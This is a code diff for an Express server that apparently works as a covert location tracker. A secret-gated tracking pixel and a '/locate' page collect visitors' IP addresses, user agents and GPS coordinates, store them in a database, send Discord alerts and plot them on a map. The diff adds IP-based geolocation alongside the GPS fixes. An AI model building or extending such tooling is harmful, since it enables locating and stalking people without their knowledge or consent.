@@ -43,7 +43,7 @@ async function lookupIP(ip) {
     return null;
   }
 
-  // Primary: ip-api.com (more reliable free tier)
+  // Primary: ip-api.com
   try {
     const json = await httpGet(`http://ip-api.com/json/${ip}?fields=status,message,lat,lon,city,country`);
     if (json && json.status === 'success' && json.lat && json.lon) {
@@ -105,6 +105,7 @@ function sendDiscordNotification(entry) {
   } catch (err) {}
 }
 
+// Tracking pixel (IP only)
 app.get('/pixel.gif', async (req, res) => {
   if (req.query.t !== SECRET) return res.status(404).end();
 
@@ -140,12 +141,17 @@ app.get('/pixel.gif', async (req, res) => {
   res.send(PIXEL);
 });
 
+// GPS + IP from the locate page
 app.post('/report', async (req, res) => {
   const secret = req.query.t || req.body.t;
   if (secret !== SECRET) return res.status(403).json({ error: 'bad secret' });
 
   const { latitude, longitude, accuracy } = req.body;
   const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
+
+  // Also look up the IP location
+  const geo = await lookupIP(ip);
+  if (geo) console.log('IP geo on GPS report for', ip, 'via', geo.source);
 
   try {
     const { error } = await supabase.from('hits').insert([{
@@ -154,6 +160,8 @@ app.post('/report', async (req, res) => {
       ua: req.headers['user-agent'] || null,
       latitude: latitude || null,
       longitude: longitude || null,
+      ip_lat: geo ? geo.lat : null,
+      ip_lon: geo ? geo.lon : null,
       query: { accuracy, source: 'gps' }
     }]);
     if (error) return res.status(500).json({ error: error.message });
@@ -177,6 +185,7 @@ app.get('/api/hits', async (req, res) => {
   }
 });
 
+// Auto location page
 app.get('/locate', (req, res) => {
   const secret = req.query.t || 'test123';
   res.send(`<!DOCTYPE html>
@@ -221,6 +230,7 @@ app.get('/locate', (req, res) => {
 </html>`);
 });
 
+// Map page
 app.get('/map', (req, res) => {
   res.send(`<!DOCTYPE html>
 <html>
